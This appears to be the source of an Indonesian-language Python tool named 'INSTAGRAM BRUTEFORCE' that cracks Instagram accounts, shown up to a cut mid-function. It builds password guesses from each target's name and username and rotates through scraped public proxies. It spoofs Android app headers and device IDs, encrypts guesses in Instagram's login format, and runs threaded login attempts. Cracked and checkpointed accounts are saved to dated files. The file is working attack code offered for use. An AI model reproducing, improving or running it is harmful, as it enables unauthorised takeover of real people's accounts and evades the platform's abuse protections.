#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
       META 2024 - NEW

INSTAGRAM BRUTEFORCE
Code By XyraaCode Dev | 11.0 | Premium Version

"""

from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import AES, PKCS1_v1_5
from Cryptodome.Random import get_random_bytes


import re, os, uuid, sys, requests, datetime, hashlib, urllib, pytz, zlib, time, json, random, base64, string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich import print as Print
from rich.panel import Panel as Nel
from rich.console import Console
from rich.tree import Tree


#-> files
from data.asset import app


P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K2 = "\033[33m"

M = K2
K = H

datetim = datetime.datetime.now()
file_ok = '%s-%s-%s'%(datetim.day,datetim.month,datetim.year)
KamuNya = b'x\x9c\xcb())(\xb6\xd2\xd7/H,.I\xd5+I\xd6/J,\xd7\xcf)(\xc8\xd651335\x06\x00\xb4|\n\x82'
temane  = []
H = '\033[90m' ; I = '\033[32m' ; P = '\033[37m'
null = 'null'
class MAIN:

   id, Loop, MethodType, ResultSuccess, ResultChechpoint,UbahData,info,proxi, \
   XyraaCodeDev, MID, PROXY, CrackDuplikat, bugbaru = [], 0, [], 0, 0, [], {}, [], {}, [], {'Update':None,'proxi':[]}, [], []

   zone_ = {'default': 'id'}
   def __init__(self):
       self.head = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}
       self.Proxis()

   def Proxis(self):
       try:
            for _ in ['http','socks4','socks5']:
                self.prox_ = requests.get(f'https://api.proxyscrape.com/v2/?request=displayproxies&protocol={_}&timeout=100000&country=all&ssl=all&anonymity=all').text.splitlines()
                for self.ulf in self.prox_:
                    self.sad = '%s://%s'%(_,self.ulf)
                    if self.sad not in self.PROXY['proxi']:self.PROXY['proxi'].append(self.sad)
       except Exception as e:
            for self.fah in ['socks4://104.37.135.145:4145', 'socks4://162.55.87.48:5566', 'socks4://171.252.131.134:11088', 'socks4://181.214.31.10:57444', 'socks4://49.254.247.82:6845', 'socks4://184.181.217.213:4145', 'socks4://103.122.1.74:7777', 'socks4://103.47.93.222:1080', 'socks4://174.64.199.79:4145', 'socks4://170.205.37.196:32961', 'socks4://50.116.31.235:50851', 'socks4://24.249.199.12:4145', 'socks4://5.161.157.229:8888', 'socks4://98.175.31.195:4145', 'socks4://170.106.171.17:11125', 'socks4://201.93.159.234:4145', 'socks4://66.29.128.242:10229', 'socks4://41.65.46.180:1981', 'socks4://115.49.10.68:8080', 'socks4://192.46.233.113:10088', 'socks4://167.86.121.208:40169', 'socks4://98.162.25.7:31653', 'socks4://91.149.203.126:1080', 'socks4://190.2.102.145:4153', 'socks5://117.74.65.207:443', 'socks4://121.240.191.138:17171', 'socks4://192.252.209.155:14455', 'socks4://109.248.167.138:3000', 'socks4://192.252.220.92:17328', 'socks4://58.18.39.58:10800', 'socks4://103.210.29.201:31433', 'socks4://18.136.241.222:3128', 'socks4://192.210.239.214:3128', 'socks4://94.23.220.136:56714', 'socks4://216.176.106.50:8080', 'socks4://72.49.49.11:31034', 'socks4://60.173.147.81:10800', 'socks4://180.163.86.221:1080', 'socks4://112.235.107.202:8080', 'socks4://152.56.142.12:47508', 'socks4://172.67.66.171:80', 'socks4://148.72.212.198:27268', 'socks4://116.199.169.1:4145', 'socks4://39.102.210.176:8080', 'socks4://104.236.171.128:41047', 'socks4://213.16.81.182:35559', 'socks4://74.119.147.209:4145', 'socks4://162.253.68.97:4145', 'socks4://181.129.62.2:47377', 'socks4://186.96.124.242:4153', 'socks5://117.74.65.207:80', 'socks4://123.4.134.59:9000', 'socks4://94.159.143.57:5678', 'socks4://157.10.80.218:80', 'socks4://103.164.190.221:5430', 'socks4://176.21.63.148:8081', 'socks4://188.163.170.130:35578', 'socks4://72.210.221.197:4145', 'socks4://190.0.15.18:5678', 'socks4://184.178.172.18:15280', 'socks4://103.236.114.38:49638', 'socks4://8.212.168.170:8080', 'socks4://138.201.21.233:43443', 'socks4://119.246.35.113:8909', 'socks4://170.80.91.15:4145', 'socks4://107.152.98.5:4145', 'socks4://36.89.253.7:5678', 'socks4://184.178.172.17:4145', 'socks4://103.123.108.225:8080', 'socks4://176.113.115.135:33413', 'socks4://72.195.34.60:27391', 'socks4://142.54.229.249:4145', 'socks4://118.135.29.12:33804', 'socks4://72.206.181.105:64935', 'socks4://64.202.184.129:54053', 'socks4://50.250.205.21:32100', 'socks4://5.182.34.16:80', 'socks4://47.91.89.3:8080', 'socks4://194.39.33.14:5723', 'socks4://108.188.147.133:80', 'socks4://178.215.163.218:4145', 'socks4://58.57.2.46:10800', 'socks4://130.255.162.54:28546', 'socks4://180.94.75.162:8080', 'socks4://3.129.7.8:80', 'socks4://67.213.212.39:58827', 'socks4://168.138.44.123:15751', 'socks4://105.235.193.46:5678', 'socks4://197.5.128.248:8080', 'socks4://139.28.221.233:9999', 'socks4://103.47.93.211:1080', 'socks4://171.247.240.103:1080', 'socks4://103.66.233.173:4145', 'socks4://185.215.53.217:3629', 'socks4://210.14.138.102:8080', 'socks4://46.34.144.199:4153', 'socks4://184.181.217.206:4145', 'socks4://203.160.59.249:4145', 'socks4://212.244.235.217:4153', 'socks4://185.132.1.221:4145', 'socks4://98.162.25.23:4145', 'socks4://43.227.129.129:83', 'socks4://8.215.15.163:8080', 'socks4://103.166.39.65:3629', 'socks4://36.92.96.179:5678', 'socks4://62.37.124.180:3128', 'socks4://138.99.176.138:999', 'socks4://36.89.89.59:5678', 'socks4://72.167.222.113:39574', 'socks4://72.10.164.178:15523', 'socks4://177.85.205.173:3629', 'socks4://162.241.46.40:37132', 'socks4://118.172.47.97:51327', 'socks4://108.181.132.115:60911', 'socks4://114.104.141.86:38801', 'socks4://67.213.212.49:63266', 'socks4://72.167.221.145:61539', 'socks4://103.47.93.238:1080', 'socks4://142.54.232.6:4145', 'socks4://192.99.207.129:57283', 'socks4://3.225.250.1:8080', 'socks4://8.212.168.170:3128', 'socks4://173.249.40.207:44944', 'socks4://88.139.117.153:4145', 'socks4://170.238.160.192:666', 'socks4://158.174.108.130:9095', 'socks4://190.115.158.161:80', 'socks4://95.111.227.164:9825', 'socks4://8.130.39.117:8088', 'socks4://8.213.129.20:8999', 'socks4://93.171.224.47:4153', 'socks4://8.213.129.20:9080', 'socks4://199.116.114.11:4145', 'socks4://23.236.216.48:6078', 'socks4://193.164.176.179:8081', 'socks4://162.240.59.234:35528', 'socks4://8.213.129.20:8081', 'socks4://72.10.164.178:3895', 'socks4://202.40.186.66:1088', 'socks4://45.61.188.134:44499', 'socks4://201.149.127.22:8080', 'socks4://124.29.249.56:5678', 'socks4://142.54.226.214:4145', 'socks4://103.87.81.86:5678', 'socks4://218.185.242.117:9050', 'socks4://154.66.108.32:3629', 'socks4://185.6.10.191:4536', 'socks4://184.178.172.5:15303', 'socks4://46.227.37.17:1088', 'socks4://47.122.62.83:80', 'socks4://47.119.19.221:80', 'socks4://222.73.242.137:80', 'socks4://138.68.155.22:11712', 'socks4://157.243.44.229:8080', 'socks4://166.0.235.5:35197', 'socks4://66.29.129.53:49055', 'socks4://94.154.221.91:5678', 'socks4://23.236.188.115:3128', 'socks4://103.60.187.1:35871', 'socks4://38.62.223.163:3128', 'socks4://95.111.227.164:53625', 'socks4://14.97.132.226:5678', 'socks4://103.225.125.161:4153', 'socks4://46.214.153.223:5678', 'socks4://69.26.240.133:19', 'socks4://23.105.170.34:41147', 'socks4://67.213.210.168:55532', 'socks4://197.32.223.5:8080', 'socks4://80.58.149.246:4145', 'socks4://251.130.60.156:42528', 'socks4://67.213.212.54:47805', 'socks4://45.67.230.130:30277', 'socks4://92.205.110.118:25042', 'socks4://216.131.73.249:1080', 'socks4://69.61.200.104:36181', 'socks4://24.249.199.4:4145', 'socks4://50.63.13.3:57159', 'socks4://190.2.115.18:4153', 'socks4://47.122.57.58:8081', 'socks4://64.187.232.70:3022', 'socks4://103.152.112.234:80', 'socks4://185.18.198.163:38188', 'socks4://64.225.4.85:9955', 'socks4://185.78.16.76:5678', 'socks4://199.102.104.70:4145', 'socks4://184.178.172.11:4145', 'socks4://200.85.169.221:1080', 'socks4://97.74.229.3:45644', 'socks4://103.47.93.236:1080', 'socks4://8.213.156.191:9080', 'socks4://103.141.189.62:5678', 'socks4://50.173.55.149:80', 'socks4://45.251.57.49:4153', 'socks4://81.12.169.254:4153', 'socks4://195.2.76.207:11531', 'socks4://185.32.47.105:4153', 'socks4://133.158.145.154:20', 'socks5://211.119.90.169:1080', 'socks4://186.248.197.210:5678', 'socks4://128.199.183.41:39047', 'socks4://69.64.52.28:32258', 'socks4://38.57.3.39:28506', 'socks4://141.105.107.152:5678', 'socks4://166.62.88.163:14827', 'socks4://103.121.214.50:4145', 'socks4://178.212.51.145:4145', 'socks4://155.50.254.18:3128', 'socks4://172.135.136.144:8081', 'socks4://72.10.164.178:2679', 'socks4://148.72.210.123:7749', 'socks4://67.227.158.154:80', 'socks4://75.119.145.154:37347', 'socks4://104.36.166.42:15832', 'socks4://213.251.185.168:10958', 'socks4://198.12.253.239:39820', 'socks4://188.209.246.243:1080', 'socks4://135.148.10.161:19212', 'socks4://162.0.220.218:41441', 'socks4://46.8.60.2:1080', 'socks4://148.72.212.252:64753', 'socks4://72.10.160.172:10425', 'socks4://45.70.206.40:4145', 'socks4://117.74.65.207:7999', 'socks4://245.215.105.89:3128', 'socks4://60.176.41.9:7890', 'socks4://184.181.217.201:4145', 'socks4://23.129.254.186:6168', 'socks4://212.19.171.48:8080', 'socks4://192.210.132.226:6196', 'socks4://177.39.193.109:3128', 'socks4://103.54.148.189:1080', 'socks4://83.40.76.242:80', 'socks4://27.123.3.141:4145', 'socks4://132.148.245.169:19483', 'socks4://162.214.75.237:24949', 'socks4://190.202.60.89:8048', 'socks4://72.195.34.58:4145', 'socks4://197.251.236.226:5678', 'socks4://200.108.190.129:9800', 'socks4://67.213.210.60:51967', 'socks4://45.124.84.110:15473', 'socks4://94.131.7.1:31991', 'socks4://119.59.101.111:80', 'socks4://191.52.213.16:999', 'socks4://211.118.30.69:1080', 'socks4://144.126.136.76:63269', 'socks4://181.143.61.124:4153', 'socks4://47.238.60.156:8081', 'socks4://103.148.45.167:4145', 'socks4://169.239.223.136:52178', 'socks4://103.14.251.16:4153', 'socks4://95.48.193.246:1080', 'socks4://190.217.20.109:999', 'socks4://176.235.139.35:10001', 'socks4://125.25.184.10:4145', 'socks4://92.205.110.118:46394', 'socks4://45.89.19.85:15397', 'socks4://177.33.84.232:47796', 'socks4://162.214.225.223:47783', 'socks4://113.132.112.34:9000', 'socks4://94.198.213.252:5678', 'socks4://222.217.99.227:9000', 'socks4://108.179.219.56:16458', 'socks4://112.78.138.163:5678', 'socks4://177.66.221.255:5678', 'socks4://217.52.126.182:80', 'socks4://51.68.181.9:33701', 'socks4://162.19.7.49:41223', 'socks4://47.104.27.165:80', 'socks4://65.21.89.117:42950', 'socks4://45.32.10.63:1081', 'socks4://43.245.119.221:5995', 'socks4://182.16.171.42:51459', 'socks4://221.1.86.176:9000', 'socks4://115.76.200.220:31166', 'socks4://31.170.19.4:4153', 'socks4://45.6.101.98:4153', 'socks4://181.28.137.18:5678', 'socks4://198.8.94.170:4145', 'socks4://5.188.66.181:8088', 'socks4://121.232.199.191:9000', 'socks4://200.170.196.94:1080', 'socks4://174.247.55.150:48931', 'socks4://1.179.148.9:36476', 'socks4://148.72.23.56:41592', 'socks4://142.93.49.250:80', 'socks4://45.89.19.21:5097', 'socks4://67.213.210.62:46761', 'socks4://192.111.137.34:18765', 'socks4://108.20.206.218:11579', 'socks4://191.49.163.135:443', 'socks4://171.254.1.190:1080', 'socks4://51.255.44.171:38869', 'socks4://39.101.65.228:3333', 'socks4://103.36.35.251:5678', 'socks4://103.53.219.203:6296', 'socks4://67.43.227.228:17103', 'socks4://116.99.228.229:24730', 'socks4://103.82.11.209:4153', 'socks4://184.181.217.220:4145', 'socks4://162.214.197.102:64195', 'socks4://85.113.156.89:55443', 'socks4://132.236.245.107:8080', 'socks4://41.174.152.29:12391', 'socks4://44.213.196.246:8080', 'socks4://213.136.93.115:14087', 'socks4://89.187.185.86:1233', 'socks4://213.6.68.210:4145', 'socks4://163.47.35.102:4145', 'socks4://162.214.198.15:43151', 'socks4://212.50.19.150:4153', 'socks4://95.216.25.222:12040', 'socks4://103.115.255.94:36331', 'socks4://38.91.106.252:19704', 'socks4://139.162.238.184:30392', 'socks4://95.216.29.208:13266', 'socks4://31.170.22.127:1080', 'socks4://166.0.235.139:56290', 'socks4://72.10.164.178:28991', 'socks4://166.62.121.127:45248', 'socks4://197.89.55.79:8080', 'socks4://148.72.215.230:27337', 'socks4://192.163.200.93:37327', 'socks4://182.16.175.174:5678', 'socks4://64.187.232.70:4195', 'socks4://94.23.222.122:10810', 'socks4://115.76.196.235:30374', 'socks4://213.251.184.216:63992', 'socks4://180.119.121.185:1337', 'socks4://103.107.68.5:5430', 'socks4://95.181.151.123:8085', 'socks4://8.213.137.155:10101', 'socks4://76.107.60.93:8085', 'socks4://98.178.72.21:10919', 'socks4://38.91.106.214:47687', 'socks4://173.212.237.43:29319']:
                self.PROXY['proxi'].append(self.fah)

   def MyRich(self, Text, chos=None):
       if os.path.isfile('cat_rich.py') is True:
          import cat_rich
          self.cat = cat_rich.xyraacode
       else:
          self.cat = 'color(8)'
       if self.cat not in temane:temane.append(self.cat)
       if chos:
          Console(width=62).print(Nel(Text,subtitle='┌─',subtitle_align='left',\
          style=self.cat))
       else:
          Console(width=62).print(Nel(Text, \
          style=self.cat))

   def RandomZone(self):
       try:
           if 'lang' in str(sys.argv):
              self.zone_.update({'default':'en'})
       except:
           self.zone_.update({'default':'id'})

   def List(self, uid):
       self.RandomZone()
       for me in uid:self.id.append(me)
       print('\n')
       self.MyRich('\
 [red]01. [white]App type manual 2024\n \
[red]02. [white]App type smartlock google 2024\n \
[red]03. [white]App type recovery password 2024\n \
[red]04. [white]App manual type add account 2023-new',True)
       self.Main()

   def Main(self):
       while True:
         x = Console(style=temane[0]).input('   └──> ')
         if x in   ['01','1']: self.MethodType.append('1')
         elif x in ['02','2']: self.MethodType.append('2')
         elif x in ['03','3']: self.MethodType.append('3')
         elif x in ['04','4']: self.MethodType.append('4')
         if len(self.MethodType): break
       self.Exekusy2()


   def pwdc(self, nama, full, komb, angka_bel=None):
       self.x,self.i = [], []
       for self.y in nama.split(' '):
           if len(self.y) <2:continue
           elif len(self.y) == 3 or len(self.y) == 4 or len(self.y) == 5:
              self.z = self.y.lower()
              if komb == '1' or komb == '01':
                 self.x.append(self.z+'0123')
                 self.x.append(self.z+'01234')
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
              elif komb == '2' or komb == '02':
                 self.x.append(self.z+'0123')
                 self.x.append(self.z+'01234')
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'123456')
              else:
                 self.x.append(self.z+'0123')
                 self.x.append(self.z+'01234')
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
              if angka_bel:
                 for self.sul in angka_bel:
                     self.x.append(f'{self.z}{self.sul}')
           else:
              self.z = self.y.lower()
              if komb == '1' or komb == '01':
                 self.x.append(self.z+'0123')
                 self.x.append(self.z+'01234')
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z)
              elif komb == '2' or komb == '02':
                 self.x.append(self.z+'0123')
                 self.x.append(self.z+'01234')
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'123456')
                 self.x.append(self.z)
              else:
                 self.x.append(self.z+'0123')
                 self.x.append(self.z+'01234')
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z)

              if angka_bel:
                 for self.sul in angka_bel:
                     self.x.append(f'{self.z}{self.sul}')
                     self.x.append(f'{self.z} {self.sul}')
           if len(nama) <5:pass
           else:
              self.x.append(nama.replace(' ','').lower())
              self.x.append(nama.lower())
           if komb == '3' or komb == '03':
              self.l = full.replace('_',' ').replace('.',' ').replace('@',' ')
              if len(self.l) <3:continue
              else:
                   try:
                       self.b = self.l.split(' ')
                       for self.r in self.b:
                           if len(self.r) <3:continue
                           elif len(self.r) <5:
                              self.x.append(self.r.lower() + '0123')
                              self.x.append(self.r.lower() + '01234')
                              self.x.append(self.r.lower() + '123')
                              self.x.append(self.r.lower() + '1234')
                              self.x.append(self.r.lower() + '12345')
                           else:
                              self.x.append(self.r.lower() + '0123')
                              self.x.append(self.r.lower() + '01234')
                              self.x.append(self.r.lower() + '123')
                              self.x.append(self.r.lower() + '1234')
                              self.x.append(self.r.lower() + '12345')
                              self.x.append(self.r.lower())
                           if angka_bel:
                              for self.sul in angka_bel:
                                  self.x.append(f'{self.z}{self.sul}')
                   except:pass
       for self.d in self.x:
           if self.d not in self.i:
              if len(self.d) <=5:pass
              else:self.i.append(self.d)
       return self.i


   def Exekusy2(self):
       self.MyRich('\
 [red]01. [white]Sandi Full Name 1-5\n \
[red]02. [white]Sandi Full Name 1-6\n \
[red]03. [white]Sandi Full Name, Username 1-5\n \
[red]04. [white]Sandi Full Name 1-5 + Input Angka Belakang',True)
       sandine = Console(style=temane[0]).input(f'   └──> ')
       if sandine not in ['1','01','2','02','3','03','4','04']:
          self.Exekusy2()

       elif sandine in ['4','04']:
          sandi_tambahan = []
          self.MyRich('[white]Ini Adalah Fitur Tambahan Angka di belakang nama, masukan kombinasi gunakan tanda koma untuk pemisahan contohnya: 28,321,2008 dan seterusnya',True)
          tambahan = Console(style=temane[0]).input(f'   └──> ').split(',')
          for self.tambah in tambahan:
              if len(self.tambah)<1:pass
              else:sandi_tambahan.append(self.tambah)

       self.MyRich(f'\
[white]Akun OK Di Simpan Di Folder : data/OK-Instagram-{file_ok}\n\
Akun CP Di Simpan Di Folder : data/CP-Instagram-{file_ok}\n\
- Mainkan Mode Pesawat Jika Proses Cepat 400 ID Slow 200 -')

       self.mayb = self.OverPower()
       with ThreadPoolExecutor(max_workers=30) as exe:
          for data in self.id:
              try:
                  idf, nama = data.split('|')
                  if sandine == '4' or sandine == '04':
                     pw = self.pwdc(nama, idf, sandine, sandi_tambahan)
                  else:
                     pw = self.pwdc(nama, idf, sandine)
                  if '1' in self.MethodType:
                      exe.submit(self.x_instagram_login_manual, idf, pw)
                  elif '3' in self.MethodType:
                      exe.submit(self.x_recovery_app, idf, pw)
                  elif '2' in self.MethodType:
                      exe.submit(self.SmartLockGoogle, idf, pw)
                  else:
                      exe.submit(self.ApiTypeAddAcc, idf, pw)
              except:pass

       if self.ResultSuccess !=0 or self.ResultChechpoint !=0:
          self.total = self.ResultSuccess + self.ResultChechpoint
          print(f'\n\n{P} Crack Selesai\n\n Anda Mendapatkan {self.total} akun\n Akun OK : {H}{self.ResultSuccess}{P}\n Akun CP : {K2}{self.ResultChechpoint}{P}\n\n Terima Kasih Telah Menggunakan Tools Ini\n \t- {H}XyraaCode Dev {P}-')
          exit(0)
       else:
          print(f'\n\n{P} Crack Selesai\n{K2} Ups Anda Tidak Mendapatkan Hasil Kali Ini\n{K2} Silahkan Ganti Target Dan Gunakan Data')
          exit(1)

   def Fafo(self, cokie):
       try:
           self.c = re.findall('csrftoken=(.*?);',str(cokie))
           self.x = {"Host": "www.instagram.com","content-length": "0","x-requested-with": "XMLHttpRequest","x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(self.c) == 0 else self.c[0],"x-ig-app-id": "936619743392459","x-instagram-ajax": "1011212827","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","content-type": "application/x-www-form-urlencoded","accept": "*/*","x-asbd-id": "129477","cookie":cokie}
           self.r = requests.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers = self.x).json()
           if 'fbAccount' in str(self.r):
              self.nama = self.r['fbAccount']['display_name']
              self.Reqz = requests.get('https://accountscenter.instagram.com/profiles/', cookies = {'cookie':cokie}).text
              self.User = re.search('{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(self.Reqz)).group(1)
           else:
              self.nama = ''
              self.User = ''
       except:
           self.nama = 'Permintaan Error'
           self.User = 'Permintaan Error'
       return( self.User, self.nama )

   def Android_ID(self, users, passwd):
       self.xyz = hashlib.md5()
       self.xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
       self.hex = self.xyz.hexdigest()
       self.xyz.update(self.hex.encode('utf-8') + '12345'.encode('utf-8'))
       return self.xyz.hexdigest()

   def friends_user(self, cookies):
       try:
            InfoHeaders = {'x-ig-app-locale': 'in_ID','x-ig-device-locale': 'in_ID','x-ig-mapped-locale': 'id_ID','x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','x-ig-app-id': '567067343352427','priority': 'u=3','user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)','accept-language': 'id-ID, en-US','x-fb-http-engine': 'Liger','x-fb-client-ip': 'True','x-fb-server-cluster': 'True'}
            self.user = re.search('ds_user_id=(\d+)',str(cookies)).group(1)
            self.info = requests.get(f'https://i.instagram.com/api/v1/users/{self.user}/info/', headers=InfoHeaders, cookies = {'cookie':cookies}).json()['user']
            self.followers = self.info['follower_count']
            self.following = self.info['following_count']
            return self.followers,self.following
       except:
            return ('pw_kham','pw_kham')

   def friends_user_chek(self, username):
       try:
           self.head.update({'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'})
           req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}', headers=self.head).json()['data']['user']
           ikut,mengikut = req['edge_followed_by']['count'],req['edge_follow']['count']
           return(ikut,mengikut)
       except:return(None,None)

   def timezone_offset(self):
       if self.zone_['default'] == 'id':zone=('Asia/Jakarta')
       else:
          zone = random.choice(pytz.all_timezones)
       self.tim = datetime.datetime.now(pytz.timezone(zone))
       self.ofs = self.tim.utcoffset().total_seconds()/60/60
       return self.ofs

   def IgUniq(self):
       return str(uuid.uuid4())

   def UserAgentApp(self):
       self.code = random.choice(['370911961','370911964','370911965','370911966','370911967','370911968','370911971','370911972','370911973','370911974','370911975','370911976','370911977','371025731'])
       self.anc = random.randint(200,344)
       self.xyz = random.randint(25,31)
       self.apc = random.randint(14,42)
       self.abc = random.randint(50,92)
       self.ulf = random.choice(['en_US','en_GB','in_ID'])
       self.realme = f'Instagram {self.anc}.0.0.{self.apc}.{self.abc} Android ({self.xyz}/14; 480dpi; 1080x2290; realme; RMX3782; RE5C6CL1; mt6835; en_US; {self.code})'
       self.huawai = f'Instagram {self.anc}.0.0.{self.apc}.{self.abc} Android ({self.xyz}/10; 480dpi; 1080x2282; HUAWEI; FRL-L22; HWFRL-M; mt6768; {self.ulf}; {self.code})'
       self.samsng = f'Instagram {self.anc}.0.0.{self.apc}.{self.abc} Android ({self.xyz}/10; 360dpi; 720x1372; samsung; SM-G965F; star2lte; samsungexynos9810; {self.ulf}; {self.code})'
       return random.choice([self.realme,self.huawai,self.samsng])

   def NewUserAgentApps(self):
       try:
           realmemodel = random.choice(app.useragent().realmemodel['realmemodel'])
           versionname = app.useragent().versionname['versionname']
           versioncode = app.useragent().versioncode['versioncode']
       except: self.UserAgentApp()

       iglocales = random.choice(['en_US','en_GB','in_ID'])
       useragent = f'Instagram {versionname} Android (34/14; 480dpi; 1080x2290; realme; {realmemodel}; RE5C6CL1; mt6835; {iglocales}; {versioncode})'
       return useragent

   def CookieBearer(self, cookie):
       self.abcd = json.loads(base64.b64decode(cookie).decode())
       self.coki = ';'.join(['%s=%s'%(x,y) for x,y in self.abcd.items()])
       return self.coki + f';dpr=2;ig_did={str(uuid.uuid4()).upper()}'

   def x_mid(self):
       if len(self.MID) > 0:
          return random.choice(self.MID)
       return ''

   def x_signature(self, x_params):
       self.x_bloks = 'dcc6b303a01f9d997e9b920abacda0e53add522d0f73c17a3bc0d72570b8e603'
       self.bk_client_context = '{"bloks_version":"%s","styles_id":"instagram"}'%(self.x_bloks)
       self.bloks_versioning_id = self.x_bloks
       return 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(x_params),urllib.parse.quote(self.bk_client_context),self.bloks_versioning_id)

   def ig_signature(self, x_data):
       return ('signed_body=SIGNATURE.%s'%(urllib.parse.quote_plus(x_data)))

   def EncryptionPassword(self, public_key, key_id, password, timestamp=str(int(time.time()))):
       try:
           session_key = get_random_bytes(32)
           iv = get_random_bytes(12)
           decoded_publickey = base64.b64decode(public_key.encode())
           recipient_key = RSA.import_key(decoded_publickey)
           cipher_rsa = PKCS1_v1_5.new(recipient_key)
           rsa_encrypted = cipher_rsa.encrypt(session_key)
           cipher_aes = AES.new(session_key, AES.MODE_GCM, iv)
           cipher_aes.update(timestamp.encode())
           aes_encrypted, tag = cipher_aes.encrypt_and_digest(password.encode("utf8"))
           size_buffer = len(rsa_encrypted).to_bytes(2, byteorder='little')
           encrypted = base64.b64encode(b''.join([b"\x01",int(key_id).to_bytes(1, byteorder='big'),iv,size_buffer,rsa_encrypted,tag,aes_encrypted]))
           password = str(encrypted.decode('utf-8'))
           return '#PWD_INSTAGRAM:4:{}:{}'.format(timestamp, password)
       except: return '#PWD_INSTAGRAM:0:{}:{}'.format(timestamp, password)

   def ApiTypeAddAcc(self, user, passwordlist):
       devid = str(uuid.uuid4())
       fayid = str(uuid.uuid4())
       adoid = ''.join(devid.replace('-','')[:16])
       ssion = requests.Session()
       igmid = self.x_mid()
       self.ok = 'data/OK-%s-%s-%s.txt'%(datetim.day,datetim.month,datetim.year)
       self.cp = 'data/CP-%s-%s-%s.txt'%(datetim.day,datetim.month,datetim.year)
       print('%s%s/%s success: %s checkpoint: %s				'%(P,self.Loop, len(self.id), self.ResultSuccess, self.ResultChechpoint),end='\r'),sys.stdout.flush()
       self.mobileconfig = {
            'bool_opt_policy':'0',
            'mobileconfigsessionless':'',
            'api_version':'3',
            'unit_type':'1',
            'query_hash':'0d8594f797327df4e1cd1ddb97aabcce8441c88889635079ede8afb7ca4ce679',
            'ts': str(datetime.datetime.now().timestamp())[:10],
            'device_id': 'd3682c7a-5663-4aef-9d94-11021dc51ecf',
            'fetch_type':'ASYNC_FULL',
            'family_device_id': '6e875eb4-121f-4e07-988f-01f680c9d00c'
       }
       self.headersmobile = {
            'host': 'i.instagram.com',
            'user-agent': 'Instagram 319.0.0.43.110 Android (31/12; 440dpi; 1080x2254; Xiaomi/Redmi; Redmi Note 9 Pro; joyeuse; qcom; in_ID; 568713873)',
            'x-ig-device-id': 'd3682c7a-5663-4aef-9d94-11021dc51ecf',
            'x-ig-device-locale': 'in_ID',
            'x-ig-android-id': 'android-00853ea0cf1aac4c',
            'x-ig-family-device-id': '6e875eb4-121f-4e07-988f-01f680c9d00c',
            'x-ig-app-id': '567067343352427',
            'x-ig-app-locale': 'in_ID',
            'x-ig-mapped-locale': 'id_ID',
            'x-ig-connection-type': 'MOBILE(LTE)',
            'x-fb-connection-type': 'MOBILE(LTE)',
            'x-fb-http-engine': 'Liger',
            'x-ig-capabilities': '3brTvw10=',
            'x-ig-www-claim': '0'
       }
       try:
           x = ssion.post('https://i.instagram.com/api/v1/launcher/mobileconfig/', data=self.mobileconfig, headers=self.headersmobile)
           key_id = x.headers.get('ig-set-password-encryption-key-id')
           public_key = x.headers.get('ig-set-password-encryption-pub-key')
       except (requests.exceptions.ConnectionError): time.sleep(30)
       if not public_key: key_id, public_key = None, None
       for password in passwordlist:
           try:
               self.api = random.choice([
                  'i.instagram.com',
                  'b.i.instagram.com'
               ])
               self.h = {
                  'host': str(self.api),
                  'x-ig-app-locale': 'en_US',
                  'x-ig-device-locale': 'in_ID',
                  'x-ig-mapped-locale': 'en_US',
                  'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-1',
                  'x-pigeon-rawclienttime': f'{str(time.time())[:14]}',
                  'x-ig-bandwidth-speed-kbps': f'{round(random.uniform(100, 300), 3)}',
                  'x-ig-bandwidth-totalbytes-b': f'{random.randint(0, 1_000_000)}',
                  'x-ig-bandwidth-totaltime-ms': f'{random.randint(0, 1_000)}',
                  'x-bloks-version-id': '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
                  'x-ig-www-claim': '0',
                  'x-bloks-is-prism-enabled': 'true',
                  'x-bloks-prism-button-version': '0',
                  'x-bloks-is-layout-rtl': 'false',
                  'x-ig-device-id': devid,
                  'x-ig-family-device-id': fayid,
                  'x-ig-android-id': f'android-{adoid}',
                  'x-ig-timezone-offset': f'{self.timezone_offset()}',
